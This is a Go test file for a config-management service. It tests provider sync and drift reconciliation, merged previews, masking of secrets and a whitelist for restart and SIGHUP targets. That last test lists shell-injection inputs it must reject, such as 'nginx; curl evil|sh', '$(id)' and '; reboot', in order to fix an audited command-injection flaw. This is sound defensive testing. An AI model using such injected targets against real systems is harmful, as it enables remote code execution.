	db, err := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{})
	if err != nil {
		t.Fatalf("打开内存库失败: %v", err)
	}
	if err := db.AutoMigrate(&File{}, &AgileApp{}, &PullToken{}); err != nil {
		t.Fatalf("迁移失败: %v", err)
	}
	if err := db.Exec(`CREATE TABLE projects (id INTEGER PRIMARY KEY, name TEXT)`).Error; err != nil {
		t.Fatal(err)
	}
	if err := db.Exec(`CREATE TABLE platform_settings (skey TEXT PRIMARY KEY, value TEXT)`).Error; err != nil {
		t.Fatal(err)
	}
	if err := db.Exec(`CREATE TABLE server_events (id INTEGER PRIMARY KEY AUTOINCREMENT, server_id INTEGER, type TEXT, message TEXT, created_at DATETIME)`).Error; err != nil {
		t.Fatal(err)
	}
	db.Exec(`INSERT INTO projects (id, name) VALUES (2, 'demo')`)
	cipher, err := cryptopkg.NewCipher("0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef")
	if err != nil {
		t.Fatal(err)
	}
	s := &Service{db: db, cipher: cipher}
	if agileURL != "" {
		if err := s.SaveKVSettings(context.Background(), agileURL, "admin", "agile-pass"); err != nil {
			t.Fatalf("配置 provider 失败: %v", err)
		}
	}
	return s
}

func TestAgileSyncWithoutProvider(t *testing.T) {
	svc := kvTestService(t, "")
	_ = svc.db.Create(&File{ProjectID: 2, Name: "app", RelPath: "prod/app.env", Path: "/x/a.env", Format: "env", Content: "A=1\n"})
	if _, err := svc.SyncAgile(context.Background(), 2, "prod", "root"); err == nil || !strings.Contains(err.Error(), "未配置") {
		t.Fatalf("未配置 provider 应明确报错: %v", err)
	}
}

func TestAgileSyncAndReconcileFromFiles(t *testing.T) {
	fa, srv := fakeAgileSSE(t)
	svc := kvTestService(t, srv.URL)
	ctx := context.Background()
	// 两个 env 文件（同应用×环境）+ 一个 yaml 文件（不参与配置中心）
	_ = svc.db.Create(&File{ProjectID: 2, Name: "基础", RelPath: "prod/base.env", Path: "/x/base.env", Format: "env", Content: "DB_HOST=127.0.0.1\nDB_PORT=5432\n"})
	_ = svc.db.Create(&File{ProjectID: 2, Name: "扩展", RelPath: "prod/extra.env", Path: "/x/extra.env", Format: "env", Content: "CACHE=redis\n"})
	_ = svc.db.Create(&File{ProjectID: 2, Name: "结构", RelPath: "prod/app.yaml", Path: "/x/app.yaml", Format: FormatYAML, Content: "server:\n  port: 1\n"})

	// 首同步：自动建 app + 两文件键值合并上线；yaml 不进
	n, err := svc.SyncAgile(ctx, 2, "prod", "root")
	if err != nil || n != 3 {
		t.Fatalf("同步失败: %v n=%d", err, n)
	}
	online := 0
	for _, c := range fa.config {
		if c["onlineStatus"] == float64(1) {
			online++
		}
	}
	if online != 3 {
		t.Fatalf("上线数 = %d, want 3", online)
	}

	// 控制台手改 + 手加（模拟漂移）
	for _, c := range fa.config {
		if c["key"] == "DB_HOST" {
			c["value"] = "9.9.9.9"
		}
	}
	fa.config = append(fa.config, map[string]any{"id": "cfg-x", "appId": "app-1", "group": "prod", "key": "rogue", "value": "1", "onlineStatus": float64(1), "status": float64(1)})
	diff, err := svc.ReconcileAgile(ctx, 2, "prod", "root")
	if err != nil {
		t.Fatalf("对账失败: %v", err)
	}
	if len(diff.Drifted) != 1 || diff.Drifted[0] != "DB_HOST" || len(diff.Extra) != 1 || diff.Extra[0] != "rogue" {
		t.Fatalf("对账结果异常: %+v", diff)
	}

	// 平台改文件值再同步：漂移项被平台覆盖，extra 不删
	svc.db.Model(&File{}).Where("rel_path = ?", "prod/base.env").
		Update("content", "DB_HOST=127.0.0.1\nDB_PORT=6543\n")
	if _, err := svc.SyncAgile(ctx, 2, "prod", "root"); err != nil {
		t.Fatalf("二次同步失败: %v", err)
	}
	for _, c := range fa.config {
		if c["key"] == "DB_PORT" && c["value"] != "6543" {
			t.Fatalf("同步未覆盖: %+v", c)
		}
	}
	diff2, _ := svc.ReconcileAgile(ctx, 2, "prod", "root")
	if len(diff2.Drifted) != 0 || len(diff2.Missing) != 0 || len(diff2.Extra) != 1 {
		t.Fatalf("同步后对账应仅剩 extra: %+v", diff2)
	}
}

// 下发钩子：未配置 provider 时静默跳过（不报错不审计）。
func TestDeployAgileHookSkipsUnconfigured(t *testing.T) {
	svc := kvTestService(t, "")
	// agileConfigured 检查短路即可（Deploy 全链路需 exec，此处验证判定函数）
	if svc.agileConfigured(context.Background()) {
		t.Fatal("未配置应为 false")
	}
}

// 合并视图：项目×环境跨文件聚合（yaml 深合并 + env 点号嵌套 → 统一 JSON 树）。
func TestMergedPreview(t *testing.T) {
	db := pullTestDB(t)
	pullSeed(t, db,
		File{Name: "应用", RelPath: "prod/app.yaml", Path: "/x/a.yaml", Format: FormatYAML, Content: "server:\n  port: 8080\n"},
		File{Name: "参数", RelPath: "prod/app.env", Path: "/x/b.env", Format: "env", Content: "feature_x=true\nnested.key=v\n"},
	)
	svc := &Service{db: db}
	out, err := svc.MergedPreview(t.Context(), 1, "prod", "json", false, "t")
	if err != nil {
		t.Fatalf("合并视图失败: %v", err)
	}
	if out.Files != 2 || out.Version == "" {
		t.Fatalf("元信息异常: %+v", out)
	}
	var m map[string]any
	if err := json.Unmarshal([]byte(out.Body), &m); err != nil {
		t.Fatalf("输出非合法 JSON: %v\n%s", err, out.Body)
	}
	srv := m["server"].(map[string]any)
	fx, _ := m["feature_x"].(string)
	nested := m["nested"].(map[string]any)
	if srv["port"] != float64(8080) || fx != "true" || nested["key"] != "v" {
		t.Fatalf("聚合结果异常: %s", out.Body)
	}
	// yaml 输出同树
	out2, err := svc.MergedPreview(t.Context(), 1, "prod", "yaml", false, "t")
	if err != nil || !strings.Contains(out2.Body, "feature_x: \"true\"") && !strings.Contains(out2.Body, "feature_x: true") {
		t.Fatalf("yaml 输出异常: %v %s", err, out2.Body)
	}
}

// 合并视图默认脱敏（2026-11-09：UI 侧 reveal 旁路收紧）——敏感键值打码且
// JSON 输出保留引号形态（仍合法 JSON）；reveal=true 返回明文。
func TestMergedPreviewMasked(t *testing.T) {
	db := pullTestDB(t)
	pullSeed(t, db,
		File{Name: "a", RelPath: "prod/a.env", Path: "/x/a.env", Format: "env", Content: "DB_HOST=10.0.0.1\nDB_PASSWORD=prodsecret\n"},
	)
	svc := &Service{db: db}
	out, err := svc.MergedPreview(t.Context(), 1, "prod", "json", false, "t")
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(out.Body, "prodsecret") {
		t.Fatalf("合并视图默认应脱敏: %s", out.Body)
	}
	if !strings.Contains(out.Body, `"DB_PASSWORD": "***"`) {
		t.Fatalf("JSON 脱敏应保留引号形态: %s", out.Body)
	}
	if !strings.Contains(out.Body, `"DB_HOST": "10.0.0.1"`) {
		t.Fatalf("非敏感键应明文: %s", out.Body)
	}
	if err := json.Unmarshal([]byte(out.Body), &map[string]any{}); err != nil {
		t.Fatalf("脱敏后应仍是合法 JSON: %v %s", err, out.Body)
	}
	// 行中元素（值后带逗号）同样保留合法形态
	if got := MaskSensitive("{\"k\": 1, \"api_token\": \"abc\", \"z\": 2}"); got != `{"k": 1, "api_token": "***", "z": 2}` {
		t.Errorf("行内 JSON 尾逗号形态: %q", got)
	}
	clear, err := svc.MergedPreview(t.Context(), 1, "prod", "json", true, "t")
	if err != nil || !strings.Contains(clear.Body, "prodsecret") {
		t.Fatalf("reveal 应返回明文: %v %s", err, clear.Body)
	}
}

// 审核边界（2026-11-09 第二轮）：单行紧凑 JSON 的多对形态——首对敏感不吞
// 后续对、结构值不被打码、整体仍是合法 JSON；env `=` 行不受影响。
func TestMaskSensitiveInlineEdges(t *testing.T) {
	cases := []struct{ in, want string }{
		// 首对敏感的多对行：后续对保留
		{`{"api_token": "abc", "z": 2}`, `{"api_token": "***", "z": 2}`},
		// 首对非敏感、行内第二对敏感：逐对打码
		{`{"k": 1, "password": "x", "z": 2}`, `{"k": 1, "password": "***", "z": 2}`},
		// 敏感键的值是对象：整体打码为字符串（合法 JSON，不泄漏内部值）
		{`{"k": 1, "secret": {"inner": "x"}, "z": 2}`, `{"k": 1, "secret": "***", "z": 2}`},
		// 单对带花括号闭合：尾 } 保留
		{`{"token": "abc"}`, `{"token": "***"}`},
		// env `=` 行（inline 正则只认冒号）不受多对判定影响
		{`DB_PWD=topsecret`, `DB_PWD=***`},
		// 值含裸冒号（URL）不是对边界：整值替换
		{`token: http://a:8080/x`, `token: ***`},
	}
	for _, c := range cases {
		if got := MaskSensitive(c.in); got != c.want {
			t.Errorf("MaskSensitive(%q)\n got  %q\n want %q", c.in, got, c.want)
		}
	}
	var m map[string]any
	if err := json.Unmarshal([]byte(MaskSensitive(`{"api_token": "abc", "z": 2}`)), &m); err != nil {
		t.Errorf("多对行脱敏后应合法 JSON: %v", err)
	}
}

// 生效目标白名单（v0.12.0 审计严重项 3）：SIGHUP/restart 目标拼进远端 shell，
// 只查非空的时代 'x$(id)y'、'nginx; curl evil|sh' 都能直接执行。
func TestValidateTargetWhitelist(t *testing.T) {
	ok := []struct{ action, target string }{
		{ApplySighup, "nginx"},
		{ApplySighup, "/usr/sbin/nginx"},
		{ApplyRestart, "app-web-1"},
		{ApplyRestart, "my.app.2"},
		{ApplyHTTP, "http://127.0.0.1/refresh"},
		{"none", ""},
	}
	for _, c := range ok {
		if err := validateTarget(c.action, c.target); err != nil {
			t.Errorf("合法目标被拒: %v(%q)", err, c.target)
		}
	}
	bad := []struct{ action, target string }{
		{ApplySighup, "x$(id)y"},
		{ApplySighup, "nginx; curl evil|sh"},
		{ApplySighup, "nginx`id`"},
		{ApplyRestart, "app; reboot"},
		{ApplyRestart, "app $(id)"},
		{ApplyRestart, "-p"},          // 前导 - 可能被当 docker 标志
		{ApplySighup, "nginx worker"}, // 空白分隔：拒绝（pkill -f 需精确名）
		{ApplySighup, ""},
		{ApplyRestart, ""},
	}
	for _, c := range bad {
		if err := validateTarget(c.action, c.target); err == nil {
			t.Errorf("非法目标未被拒: action=%s target=%q", c.action, c.target)
		}
	}
}
